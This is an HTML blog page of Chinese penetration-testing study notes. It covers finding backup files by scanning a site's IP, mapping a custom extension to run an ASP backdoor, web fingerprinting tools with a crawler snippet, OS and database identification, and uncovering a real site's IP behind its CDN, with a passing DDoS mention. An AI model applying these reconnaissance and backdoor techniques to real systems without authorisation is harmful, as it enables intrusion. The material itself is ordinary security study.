@@ -1,0 +1,1259 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>2021-9-4开学笔记 | Gridea</title>
+<meta name="description" content="温故而知新">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1633486821567">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://jinqipiaopiao.github.io//styles/main.css">
+
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+  </head>
+  <body>
+  
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="https://jinqipiaopiao.github.io/">Gridea</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="/" class="menu">
+                首页
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/archives" class="menu">
+                归档
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/tags" class="menu">
+                标签
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/about" class="menu">
+                关于
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          <article class="article">
+            <h1>2021-9-4开学笔记</h1>
+            <p class="article-meta">
+              2021-09-13
+              
+            </p>
+            
+            <div class="post-content">
+              <h1 id="2021-09-13">2021-09-13</h1>
+<p>ip访问与域名访问有什么差别：（域名访问的时IP访问的真子集，IP访问的是根目录，域名访问的是根目录下的站点目录）</p>
+<p>IP地址访问的时候是访问的www文件下的<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1631504961949.png" alt="" loading="lazy"></p>
+<p>而用域名访问的时候是特定的文件夹，是www文件下的一个文件<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1631504967445.png" alt="" loading="lazy"></p>
+<p>IP地址访问的话就能扫到网站同一目录下的文件夹，包括数据备份文件和一下看不到的文件，因为一般人就把网站的备份文件就放在与网站同一目录下，如果用域名访问的话就不能扫到文件，而如果用IP地址扫描的话就能扫到了网站的备份文件</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1631504973512.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1631504977621.png" alt="" loading="lazy"><br>
+添加这个东西之后放一个后缀名为xiaodi8的文件就能自动解析为asp文件（放一个asp后门）<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1631504981216.png" alt="" loading="lazy"><br>
+然后进行连接即可看见文件内部结构</p>
+<p>文件夹属性<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1631504984321.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1631504988237.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1631504992831.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1631504996809.png" alt="" loading="lazy"></p>
+<p>无：<br>
+此时绕过思路就是换目录<br>
+设置根目录的话就不科学，因为它里面正常文件有脚本型文件所以上面所述的给予无权限一般只给images文件加的权限<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1631505001278.png" alt="" loading="lazy"></p>
+<p>通过数据包的返回即可知道搭建的平台<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1631505005537.png" alt="" loading="lazy"></p>
+<h1 id="2021-09-14">2021-09-14</h1>
+<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1631668904883.png" alt="" loading="lazy"></figure>
+<p>本文通过分析web指纹的检测对象、检测方法、检测原理及常用工具，设计了一个简易的指纹搜集脚本来协助发现新指纹，并提取了多个开源指纹识别工具的规则库并进行了规则重组，开发了一个简单快捷的指纹识别小工具TideFinger，并实现了一套在线的指纹识别平台“潮汐指纹”，希望能为大家带来方便。</p>
+<p>前言<br>
+在web渗透过程中，Web指纹识别是信息收集环节中一个比较重要的步骤，通过一些开源的工具、平台或者手工检测CMS系统是公开的CMS程序还是二次开发至关重要，能准确的获取CMS类型、Web服务组件类型及版本信息可以帮助安全工程师快速有效的去验证已知漏洞。</p>
+<p>在指纹识别的学习过程中，借用了很多开源的工具和指纹库，如fofa、WhatWeb、w11scan、WebEye、御剑等等，在此感谢各种大佬的无私奉献。本文并无技术上的创新和突破，只是把一些指纹库重新进行了整合和梳理并进行了开源。</p>
+<p>tips：文末有福利<sub>我们将搜集到的一些指纹工具、指纹库等资料打包供大家下载</sub></p>
+<p>常见指纹检测的对象<br>
+1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等；</p>
+<p>2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等；</p>
+<p>3、Web服务器：比如Apache、lighttpd, Nginx, IIS等；</p>
+<p>4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等；</p>
+<p>5、开发语言：比如PHP、Java、Ruby、Python、C#等；</p>
+<p>6、操作系统信息：比如linux、win2k8、win7、kali、centos等；</p>
+<p>7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等；</p>
+<p>8、WAF信息：是否使用waf，如Topsec、Jiasule、Yundun等；</p>
+<p>9、IP及域名信息：IP和域名注册信息、服务商信息等；</p>
+<p>10、端口信息：有些软件或平台还会探测服务器开放的常见端口。</p>
+<p>常见的指纹识别方式<br>
+1、特定文件的MD5<br>
+一些网站的特定图片文件、js文件、CSS等静态文件，如favicon.ico、css、logo.ico、js等文件一般不会修改，通过爬虫对这些文件进行抓取并比对md5值，如果和规则库中的Md5一致则说明是同一CMS。这种方式速度比较快，误报率相对低一些，但也不排除有些二次开发的CMS会修改这些文件。</p>
+<p>2、正常页面或错误网页中包含的关键字<br>
+先访问首页或特定页面如robots.txt等，通过正则的方式去匹配某些关键字，如Powered by Discuz、dedecms等。</p>
+<p>或者可以构造错误页面，根据报错信息来判断使用的CMS或者中间件信息，比较常见的如tomcat的报错页面。</p>
+<p>3、请求头信息的关键字匹配<br>
+根据网站response返回头信息进行关键字匹配，whatweb和Wappalyzer就是通过banner信息来快速识别指纹，之前fofa的web指纹库很多都是使用的这种方法，效率非常高，基本请求一次就可以，但搜集这些规则可能会耗时很长。而且这些banner信息有些很容易被改掉。</p>
+<p>根据response header一般有以下几种识别方式：</p>
+<p>（1）查看http响应报头的X-Powered-By字段来识别；</p>
+<p>（2）根据Cookies来进行判断，比如一些waf会在返回头中包含一些信息，如360wzws、Safedog、yunsuo等；</p>
+<p>（3）根据header中的Server信息来判断，如DVRDVS-Webs、yunjiasu-nginx、Mod_Security、nginx-wallarm等；</p>
+<p>（4）根据WWW-Authenticate进行判断，一些路由交换设备可能存在这个字段，如NETCORE、huawei、h3c等设备。</p>
+<p>4、部分URL中包含的关键字，比如wp-includes、dede等URL关键特征<br>
+通过规则库去探测是否有相应目录，或者根据爬虫结果对链接url进行分析，或者对robots.txt文件中目录进行检测等等方式，通过url地址来判别是否使用了某CMS，比如wordpress默认存在wp-includes和wp-admin目录，织梦默认管理后台为dede目录，solr平台可能使用/solr目录，weblogic可能使用wls-wsat目录等。</p>
+<p>5、开发语言的识别<br>
+web开发语言一般常见的有PHP、jsp、aspx、asp等，常见的识别方式有：</p>
+<p>（1）通过爬虫获取动态链接进行直接判断是比较简便的方法。</p>
+<pre><code>asp判别规则如下 &lt;a[^&gt;]*?href=('|&quot;)[^http][^&gt;]*?\.asp(\?|\#|\1) ，其他语言可替换相应asp即可。
+</code></pre>
+<p>（2）通过 X-Powered-By 进行识别</p>
+<p>比较常见的有 X-Powered-By: ASP.NET 或者 X-Powered-By: PHP/7.1.8</p>
+<p>（3）通过 Set-Cookie 进行识别</p>
+<p>这种方法比较常见也很快捷，比如 Set-Cookie 中包含 PHPSSIONID 说明是php、包含 JSESSIONID 说明是java、包含 ASP.NET_SessionId 说明是aspx等。</p>
+<p>指纹识别工具<br>
+在研究指纹识别技术的时候，不可避免的分析了大量指纹识别工具，在此将自己用过的几个感觉不错的工具和平台介绍一下。</p>
+<p>国外指纹识别工具<br>
+WhatWeb（推荐指数★★★★★）</p>
+<pre><code>下载地址： https://github.com/urbanadventurer/WhatWeb
+</code></pre>
+<p>Whatweb 是一个开源的网站指纹识别软件，拥有超过1700+个插件，它能识别的指纹包括 cms 类型、博客平台、网站流量分析软件、javascript 库、网站服务器，还可以识别版本号、邮箱地址、账户 id、web 框架模块等。</p>
+<p>Whatweb 是基于 ruby 语言开发，因此可以安装在具备 ruby 环境的系统中，目前支持 Windows/Mac OSX/Linux。</p>
+<pre><code>在debian/ubuntu系统下可直接`apt-get install whatweb`,kali已自带。
+使用非常简单whatweb http://www.tidesec.net 即可，也可以加参数-v显示更详细的信息。
+</code></pre>
+<p>Wapplyzer（推荐指数★★★★）</p>
+<pre><code>下载地址： https://github.com/AliasIO/Wappalyzer
+</code></pre>
+<p>Wappalyzer 是一个实用的跨平台网站分析工具，用于帮助开发者、研究者和设计者检测网页使用的是什么技术，以更好地衡量自己的项目中该使用什么技术。Wappalyzer 的功能和 BuiltWith 类似，可检测内容管理系统（CMS），电子商务平台、Web服务器、JavaScript框架和已安装的分析工具等。</p>
+<p>Wappalyzer可直接在chrome或火狐的应用商城直接搜索安装。Wappalyzer目前可识别65个大类的1216个应用，查看可检测的应用程序列表：</p>
+<pre><code>https://wappalyzer.com/applications
+</code></pre>
+<p>Whatruns（推荐指数★★★★）</p>
+<p>Whatruns是为chrome开发的一款web指纹识别程序，还可以显示托管的CDN、wordpress插件、wordpress字体等，拥有丰富的插件支持。</p>
+<p>跟Wappalyzer安装类似，Whatruns可直接在chrome应用商城直接搜索安装。</p>
+<p>安装完成后，通过插件图标来获取服务的详细运行信息，效果如下。有时候信息会比Wapplyzer还详细一些，但有时候获取速度稍慢。</p>
+<p>Plecost（推荐指数★★★）</p>
+<pre><code>下载地址： https://github.com/iniqua/plecost
+</code></pre>
+<p>Plecost是Wordpress博客引擎的漏洞指纹识别和漏洞查找器，能识别Wordpress版本并能查找到cve，不过访问不了google的话可能有些功能就受限了。Plecost基于python架构，利用了Beautiful Soup来解析html、xml文件识别网站使用的插件及版本。</p>
+<pre><code>使用也比较方便 plecost -i /usr/share/plecost/wp_plugin_list.txt http://www.freebuf.com
+</code></pre>
+<p>BlindElephant（推荐指数★★）</p>
+<pre><code>下载地址： https://github.com/lokifer/BlindElephant
+</code></pre>
+<p>BlindElephant是一款Web应用程序指纹识别工具。该工具可以读取目标网站的特定静态文件，计算其对应的哈希值，然后和预先计算出的哈希值做对比，从而判断目标网站的类型和版本号。目前，该工具支持15种常见的Web应用程序的几百个版本。同时，它还提供WordPress和Joomla的各种插件。该工具还允许用户自己扩展，添加更多的版本支持。</p>
+<p>不过该软件最新更新是在2013年，插件库应该算比较旧的了。</p>
+<pre><code>下载及安装可参考 https://github.com/lokifer/BlindElephant ，kali中已经内置。
+
+使用命令： BlindElephant.py http://www.freebuf.com wordpress
+</code></pre>
+<p>国内指纹识别工具<br>
+御剑web指纹识别程序</p>
+<pre><code>下载地址： https://www.webshell.cc/4697.html
+</code></pre>
+<p>御剑web指纹识别程序是御剑大神开发的一款CMS指纹识别小工具，该程序由.NET 2.0框架开发，配置灵活、支持自定义关键字和正则匹配两种模式、使用起来简洁、体验良好。在指纹命中方面表现不错、识别速度很快、但目前比较明显的缺陷是指纹的配置库偏少。</p>
+<p>windows下图形界面，比较亲民，扫描速度略慢，指纹库略少，可手工更新。</p>
+<p>Test404轻量WEB指纹识别</p>
+<pre><code>下载地址： https://www.test404.com/post-1618.html
+</code></pre>
+<p>Test404轻量WEB指纹识别程序是一款CMS指纹识别小工具，配置灵活、支持自行添加字典、使用起来简洁、体验良好。在指纹命中方面表现不错、识别速度很快。可手动更新指纹识别库，而且该软件在2019.04月刚刚更新了一版。</p>
+<p>w11scan分布式WEB指纹识别平台</p>
+<p>w11scan是一款分布式的WEB指纹识别系统（包括CMS识别、js框架、组件容器、代码语言、WAF等等），管理员可以在WEB端新增/修改指纹，建立批量的扫描任务，并且支持多种搜索语法。</p>
+<pre><code>安装和下载可参考： https://github.com/w-digital-scanner/w11scan
+</code></pre>
+<p>手工安装稍微复杂，不过作者提供了docker部署，方便很多，使用了Mongodb，内置了1800多条常见的指纹，可以识别多达538种常见CMS，当然也可以手工添加指纹。</p>
+<p>Dayu指纹识别工具</p>
+<pre><code>下载地址： https://github.com/Ms0x0/Dayu
+</code></pre>
+<p>“大禹”为一款c/s结构jar文件工具，只需本地安装java环境，加参数-u即可，具体设置参数可参考github介绍。</p>
+<p>WebEye</p>
+<pre><code>下载地址： https://github.com/zerokeeper/WebEye/
+</code></pre>
+<p>WebEye可快速简单地识别WEB服务器类型、CMS类型、WAF类型、WHOIS信息、以及语言框架，使用异步实现指纹的快速识别。</p>
+<p>识别速度比较快，不过指纹库不是很多，指纹库不是基于md5之类的，而是类似于fofa通过http头信息、关键字等进行快速识别。</p>
+<p>作者对指纹进行了分类，如摄像头、waf、cdn、网络设备等，很多指纹都是精心搜集的。</p>
+<p>WTF_Scan</p>
+<pre><code>下载地址： https://github.com/dyboy2017/WTF_Scan
+</code></pre>
+<p>WTF团队出品的指纹识别平台，包括的功能也相对比较多，除了指纹识别外，还有DNS解析、子域名、CDN、端口扫描、敏感目录等。</p>
+<p>不过就单独说指纹规则来说，不算很多，可以自己添加完善，在 WTF_Scan/wtf/app/api/cms/cms.txt 文件中进行指纹修改。</p>
+<p>Webfinger</p>
+<p>基于fofa的规则库进行快速检索，大约2000+条指纹数据，位于lib/web.db可自行添加修改。</p>
+<pre><code>下载地址： https://github.com/se55i0n/Webfinger
+
+类似的还有个CMSCAN https://github.com/cuijianxiong/cmscan/
+</code></pre>
+<p>FingerPrint</p>
+<p>好像是百度的一个MM用perl写的一款工具，调用Wappalyzer模块进行指纹识别。</p>
+<pre><code>下载地址： https://github.com/tanjiti/FingerPrint
+</code></pre>
+<p>在线指纹识别<br>
+云悉指纹识别</p>
+<pre><code>http://www.yunsee.cn/
+</code></pre>
+<p>指纹库很强大，速度也很快，我们前端还仿了下云悉的界面，免费服务，好像还能提供api接口，学习的榜样！</p>
+<p>如果指纹能开源就好了，哈哈~~</p>
+<p>bugscaner指纹识别</p>
+<pre><code>http://whatweb.bugscaner.com/look/
+</code></pre>
+<p>目前好像指纹比较少，很多都识别不出来了。</p>
+<pre><code>whatweb.net
+
+https://whatweb.net/
+</code></pre>
+<p>之前功能还不错，现在好像只能查看到header信息了。</p>
+<p>未知指纹发现<br>
+目前新指纹的识别基本还是靠人工发现然后分析规则再进行添加，所以各平台都有提交指纹的功能，但是我们没有这种资源，只能另想办法。</p>
+<p>于是想到了一个比较笨的方法：从网站中爬取一些静态文件，如png、ico、jpg、css、js等，提取url地址、文件名、计算md5写入数据库，这样再爬下一个网站，一旦发现有相同的md5，就把新的url也加入到那条记录中，并把hint值加1，这样爬取10W个站点后，就能得到一个比较客观的不同网站使用相同md5文件的数据了。</p>
+<p>获取链接代码部分</p>
+<pre><code>excludeext = ['.png', '.ico', '.gif','.svg', '.jpeg','js','css','xml','txt']
+
+def getPageLinks(url):
+
+try:
+headers = requests_headers()
+
+content = requests.get(url, timeout=5, headers=headers, verify=False).text.encode('utf-8')
+links = []
+tags = ['a', 'A', 'link', 'script', 'area', 'iframe', 'form']  # img
+tos = ['href', 'src', 'action']
+if url[-1:] == '/':
+url = url[:-1]
+try:
+for tag in tags:
+for to in tos:
+link1 = re.findall(r'&lt;%s.*?%s=&quot;(.*?)&quot;' % (tag, to), str(content))
+link2 = re.findall(r'&lt;%s.*?%s=\'(.*?)\'' % (tag, to), str(content))
+for i in link1:
+links.append(i)
+
+for i in link2:
+if i not in links:
+links.append(i)
+
+except Exception, e:
+print e
+print '[!] Get link error'
+pass
+return links
+except:
+return []
+有兴趣的可以查看具体代码 https://github.com/TideSec/TideFinger/blob/master/count_file_md5.py 文件。
+</code></pre>
+<p>爬取的结果如下：</p>
+<p>当然了，里面肯定很多都属于误报，比如上图中第一个其实是个500错误页面，所以出现的比较多，第二个是政府网站最下边那个常见的“纠错”的js，所以用的也比较多…</p>
+<p>经过一些分析整理也发现了一些小众的CMS和建站系统的指纹，比如三一网络建站系统的 newsxx.php ，比如大汉JCM的 jhelper_tool_style.css 等等，后续会持续把这些新的指纹丰富到指纹库中去。</p>
+<p>指纹识别脚本<br>
+有了指纹库之后，识别脚本就相对比较简单了，已有的一些也都比较成熟了，直接使用了webfinger和whatcms的部分代码并进行了整合优化，于是就有了TideFinger。</p>
+<p>1、功能逻辑都比较简单，先用fofa库去匹配，然后获取一定banner，如果banner中识别除了cms，则返回结果，如果未识别到cms，则会调用cms规则库进行匹配各规则。</p>
+<p>2、脚本支持代理模式，当设置了-p参数，且 proxys_ips.txt 文件包含代理地址时，脚本会随机调用代理地址进行扫描，以避免被封ip，不过这样的话效率可能会低一些。毕竟搜集的免费代理质量还是差一些，速度会慢很多。有钱人可以找收费代理池，然后每个规则都用不同代理去请求，这样肯定不会被封！</p>
+<p>代理地址的搜集可以使用我修改的另一个代理池 https://github.com/TideSec/Proxy_Pool ，提供了自动化的代理ip抓取+评估+存储+展示+接口调用。</p>
+<p>3、经测试，一般网站把所有指纹跑一遍大约需要30秒时间，个别的网站响应比较慢的可能耗时更长一些，可以通过设置网站超时时间进行控制。</p>
+<p>安装python2依赖库</p>
+<pre><code>pip install lxml
+pip install requests
+pip install bs4
+</code></pre>
+<p>说明：sqlite3库在Python 2.5.x 以上版本默认自带了该模块，如提示sqlite3出错请自行排查。<br>
+执行脚本</p>
+<pre><code>$ python TideFinger.py
+
+Usage: python TideFinger.py -u http://www.123.com [-p 1] [-m 50] [-t 5]
+
+-u: 待检测目标URL地址
+-p: 指定该选项为1后，说明启用代理检测，请确保代理文件名为proxys_ips.txt,每行一条代理，格式如: 124.225.223.101:80
+-m: 指纹匹配的线程数，不指定时默认为50
+-t: 网站响应超时时间，默认为5秒
+</code></pre>
+<p>指纹识别界面如下：</p>
+<p>指纹识别平台<br>
+在有了指纹库和识别脚本之后，我们想继续完善下这个功能，于是又加入了其他一些功能，有了这个在线指纹</p>
+<pre><code>查询平台 http://finger.tidesec.net 。
+</code></pre>
+<p>开始想加的很多，但后来在速度和时间方面不得不进行了一定的取舍，于是就有了目前如下的功能。</p>
+<p>1、网站信息：网站标题、状态码、302跳转信息等；</p>
+<p>2、IP地址信息：IP归属地、IP服务商信息、GPS信息；</p>
+<p>3、CDN识别：对目标是否使用CDN进行检测，但目前CDN识别指纹还不多，对部分识别出使用CDN的目标还会列出来CNAME；</p>
+<p>4、中间件识别：主要通过http头信息中的XPB、server等字段获取中间件信息，如nginx、iis、tomcat等；</p>
+<p>5、更多banner：主要是调用了whatweb和Wapplyzer进行更多banner信息的获取，如jquery、bootstrap等；</p>
+<p>6、操作系统识别：识别比较简单，通过ttl值和文件大小写是否敏感…用nmap去识别的话速度太慢…</p>
+<p>小福利<br>
+1、指纹检测工具下载<br>
+我们把上面的13款 指纹识别工具 和搜集到的一些 论文资料 进行了汇总打包，大家可以直接下载。</p>
+<pre><code>下载地址：https://pan.baidu.com/s/190K34cwjAWDUMLtR8EWvNA 提取码：5y4o 解压密码www.tidesec.net
+</code></pre>
+<p>后续如有更新，会在我们公众号 TideSec安全团队 上提供下载，回复“指纹工具”即可获取最新指纹识别工具下载地址。</p>
+<p>2、指纹库下载<br>
+我们在GitHub上提供的是2019年4月的指纹库（还未进行大量的命中率测试），后续我们还会优化调整命中策略、未知指纹识别方法，持续更新优化指纹库。</p>
+<pre><code>https://www.tuicool.com/articles/iQBnAvv
+
+https://www.freebuf.com/articles/web/202560.html?utm_source=tuicool&amp;utm_medium=referral
+</code></pre>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「ArthurKingYs」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/u011001084/article/details/90199446</p>
+<h1 id="2021-09-15">2021-09-15</h1>
+<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1631670532262.png" alt="" loading="lazy"></figure>
+<p>#操作系统层面</p>
+<p><strong>识别操作系统常见方法：</strong><br>
+1)将网站大小写混用如果相同说明是windows服务器搭建的否则就是linux，<br>
+2)用nmap识别，<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1631672684636.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1631672689303.png" alt="" loading="lazy"><br>
+3)TTL值来判断(不太准确一般不建议)<br>
+(ping一下Linux系统的TTL值为64或255，<br>
+Windows NT/2000/XP系统的TTL值为128，<br>
+Windows 98系统的TTL值为32，<br>
+UNIX主机的TTL值为255。)，</p>
+<p><strong>2.简要两者区别及识别意义</strong><br>
+1)首先盘的分布不一样<br>
+2)文件放在不同的系统上所展现出来的也不一样<br>
+3)识别的意义就是按照操作系统的不一样来运用不同的漏洞来作进一步的测试</p>
+<p><strong>3.操作系统层面漏洞类型对应意义</strong><br>
+1)操作系统漏洞分类</p>
+<p>不同角度看安全漏洞的分类，对一个特定程序的安全漏洞可以从多方面进行分类。</p>
+<p>操作系统漏洞分类1、从作用范围角度看分为</p>
+<p>●远程漏洞，攻击者可以利用并直接通过网络发起攻击的漏洞。这类漏洞危害极大，攻击者能随心所欲的通过此漏洞操作他人的电脑。并且此类漏洞很容易导致蠕虫攻击，在Windows。</p>
+<p>●本地漏洞，攻击者必须在本机拥有访问权限前提下才能发起攻击的漏洞。比较典型的是本地权限提升漏洞，这类漏洞在Unix系统中广泛存在，能让普通用户获得最高管理员权限。</p>
+<p>操作系统漏洞分类2、从用户群体分类</p>
+<p>●大众类软件的漏洞。如Windows的漏洞、IE的漏洞等等。</p>
+<p>●专用软件的漏洞。如Oracle漏洞、Apache漏洞等等。</p>
+<p>操作系统漏洞分类3、从数据角度看分为</p>
+<p>●能读按理不能读的数据，包括内存中的数据、文件中的数据、用户输入的数据、数据库中的数据、网络上传输的数据等等。</p>
+<p>●能把指定的内容写入指定的地方(这个地方包括文件、内存、数据库等)</p>
+<p>●输入的数据能被执行(包括按机器码执行、按Shell代码执行、按SQL代码执行等等)</p>
+<p>操作系统漏洞分类4、从触发条件上看可以分为</p>
+<p>●主动触发漏洞，攻击者可以主动利用该漏洞进行攻击，如直接访问他人计算机。</p>
+<p>●被动触发漏洞，必须要计算机的操作人员配合才能进行攻击利用的漏洞。比如攻击者给管理员发一封邮件，带了一个特殊的jpg图片文件，如果管理员打开图片文件就会导致看图软件的某个漏洞被触发，从而系统被攻击，但如果管理员不看这个图片则不会受攻击。</p>
+<p>操作系统漏洞分类5、从操作角度看可分为</p>
+<p>●文件操作类型，主要为操作的目标文件路径可被控制(如通过参数、配置文件、环境变量、符号链接灯)，这样就可能导致下面两个问题：</p>
+<p>◇写入内容可被控制，从而可伪造文件内容，导致权限提升或直接修改重要数据(如修改存贷数据)，这类漏洞有很多，如历史上Oracle TNS LOG文件可指定漏洞，可导致任何人可控制运行Oracle服务的计算机;</p>
+<p>◇内容信息可被输出，包含内容被打印到屏幕、记录到可读的日志文件、产生可被用户读的core文件等等，这类漏洞在历史上Unix系统中的crontab子系统中出现过很多次，普通用户能读受保护的shadow文件;</p>
+<p>●内存覆盖，主要为内存单元可指定，写入内容可指定，这样就能执行攻击者想执行的代码(缓冲区溢出、格式串漏洞、PTrace漏洞、历史上Windows2000的硬件调试寄存器用户可写漏洞)或直接修改内存中的机密数据。</p>
+<p>●逻辑错误，这类漏洞广泛存在，但很少有范式，所以难以查觉，可细分为：</p>
+<p>◇条件竞争漏洞(通常为设计问题，典型的有Ptrace漏洞、广泛存在的文件操作时序竞争)</p>
+<p>◇策略错误，通常为设计问题，如历史上FreeBSD的Smart IO漏洞。</p>
+<p>◇算法问题(通常为设计问题或代码实现问题)，如历史上微软的Windows 95/98的共享口令可轻易获取漏洞。</p>
+<p>◇设计的不完善，如TCP/IP协议中的3步握手导致了SYN FLOOD拒绝服务攻击。</p>
+<p>◇实现中的错误(通常为设计没有问题，但编码人员出现了逻辑错误，如历史上博彩系统的伪随机算法实现问题)</p>
+<p>●外部命令执行问题，典型的有外部命令可被控制(通过PATH变量，输入中的SHELL特殊字符等等)和SQL注入问题。</p>
+<p>操作系统漏洞分类6、从时序上看可分为</p>
+<p>●已发现很久的漏洞：厂商已经发布补丁或修补方法，很多人都已经知道。这类漏洞通常很多人已经进行了修补，宏观上看危害比较小。</p>
+<p>●刚发现的漏洞：厂商刚发补丁或修补方法，知道的人还不多。相对于上一种漏洞其危害性较大，如果此时出现了蠕虫或傻瓜化的利用程序，那么会导致大批系统受到攻击。</p>
+<p>●0day：还没有公开的漏洞，在私下交易中的。这类漏洞通常对大众不会有什么影响，但会导致攻击者瞄准的目标受到精确攻击，危害也是非常之大。</p>
+<p><strong>影响范围</strong><br>
+1)和权限挂钩，以便进一步进行相关渗透，或者就是简单的崩溃一下</p>
+<h1 id="数据库层面">数据库层面</h1>
+<p><strong>1.识别数据库类型常见方法</strong><br>
+1)首先通过网站来识别数据库（asp+access，aspx+mssql，jsp+mssql | oracle，python+mongodb，php+mysql）<br>
+2)端口扫描用nmap扫描操作系统时会出现响应端口以及状态(filtered由于报文无法到达指定的端口，open是开放，nmap不能够决定端口的开放状态)</p>
+<h1 id="补充">补充</h1>
+<p>出去常规web安全及app安全测试外，类似服务器单一或复杂的其他服务（邮件，游戏，附在均衡），也可以作为安全测试目标，此类目标测试原则只是少了web应用或其他安全问题，</p>
+<h1 id="2021-09-23">2021-09-23</h1>
+<p>#CDN的相关技术<br>
+<strong>如何判断目标存在CDN服务?</strong><br>
+通过ping.chinaz.com来看是否返回的地址都一样如果一样的话就说明没有cdn，如果不一样的话就说明存在相关技术<br>
+利用多节点技术进行请求返回判断</p>
+<p><strong>CDN对于安全测试有那些影响?</strong><br>
+如果扫描的网站使用了cdn技术，那我们直接访问的可能不是对方的真实iIP，而是缓存服务器，即访问其真实服务器的时候会受到阻碍</p>
+<p><strong>目前常见的CDN绕过技术有哪些?</strong><br>
+子域名查询：网站管理者可能只在www.xxx.com设置了cdn服务，而在xxx.com没有设置cdn服务，可以使用超级ping进行验证：ping.chinaz.com</p>
+<p>邮件服务查询：很多公司有自己的邮箱服务器，而邮箱服务器绝大多数不会设置cdn服务，可以通过给自己发送的邮件然后通过查看源码即可知道</p>
+<p>国外地址请求：某些国家可能没有cdn服务器</p>
+<p>遗留文件，扫描全网：通过访问遗留文件，可能发现其真实ip</p>
+<p>黑暗引擎搜索特定文件：fofa、zoomeye、Shodan</p>
+<p>dns历史记录，以量打量：查询以前还未设置CDN服务的IP地址；采用ddos攻击，通过消耗节点的IP地址，然后达到最后访问真实IP地址的情况。</p>
+<p>CDN真实lP地址获取后绑定指向地址：当获取有可能的IP地址的时候通过修改本地hosts解析指向文件</p>
+<p>更改木地HOST:解析指向文件</p>
+<p>演示案例：<br>
+1.利用子域名请求获取真实IP<br>
+ping www.xuersi.com<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632361964561.png" alt="" loading="lazy"><br>
+ping xuersi.com<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632361970513.png" alt="" loading="lazy"></p>
+<p>2.利用国外地址请求获取真实ip（https://get-site-ip.com/ 查询 www.xueersi.com ）<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632361975125.png" alt="" loading="lazy"></p>
+<p>3.利用第三方接口查询获取真实ip（https://get-site-ip.com）<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632361978600.png" alt="" loading="lazy"></p>
+<p>4.利用邮件服务器接口获取真实ip<br>
+以墨者学院注册邮件为例<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632361983761.png" alt="" loading="lazy"></p>
+<p>怎么通过邮件查询对方IP地址<br>
+https://jingyan.baidu.com/article/c85b7a640c84d6003bac9527.html<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632361987838.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632361992202.png" alt="" loading="lazy"><br>
+如何确定他的IP就是上述的IP呢？</p>
+<p>(1)有人情味的方法:查备案地址、备案号<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632361996144.png" alt="" loading="lazy"><br>
+基本上可以确定其重庆的这个IP</p>
+<p>(2) 通过修改本地host文件进行验证</p>
+<p>思路：将我们想要测试的IP地址添加到host文件中进行测试，如果浏览器能打开这个网址，这个IP可能是我们要找的真实IP；如果不可以，就一定不是。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632361999939.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632362005735.png" alt="" loading="lazy"></p>
+<p>6.5 利用黑暗引擎搜索特定文件获取真实IP<br>
+shodan</p>
+<h1 id="2021-09-26">2021-09-26</h1>
+<h1 id="信息收集-app及其他资产等">信息收集-app及其他资产等</h1>
